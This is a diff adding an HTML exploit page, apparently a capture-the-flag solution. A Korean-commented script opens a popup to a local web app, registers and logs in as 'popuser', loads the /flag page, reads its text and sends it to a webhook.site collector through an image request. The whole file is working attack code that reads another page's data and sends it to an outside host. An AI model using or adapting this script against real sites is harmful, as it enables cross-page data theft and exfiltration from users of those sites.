@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// localhost:3000을 팝업으로 열기
+var popup = window.open('http://localhost:3000/register');
+
+setTimeout(function(){
+  try {
+    // register
+    popup.document.querySelector('input[name="username"]').value = 'popuser';
+    popup.document.querySelector('input[name="password"]').value = 'popuser';
+    popup.document.querySelector('form').submit();
+  } catch(e) {
+    console.log(e);
+  }
+}, 300);
+
+setTimeout(function(){
+  popup.location.href = 'http://localhost:3000/login';
+}, 600);
+
+setTimeout(function(){
+  try {
+    popup.document.querySelector('input[name="username"]').value = 'popuser';
+    popup.document.querySelector('input[name="password"]').value = 'popuser';
+    popup.document.querySelector('form').submit();
+  } catch(e) {
+    console.log(e);
+  }
+}, 900);
+
+setTimeout(function(){
+  popup.location.href = 'http://localhost:3000/flag';
+}, 1200);
+
+setTimeout(function(){
+  try {
+    var flag = popup.document.body.innerText;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(flag);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 1500);
+</script>
+</body>
+</html>
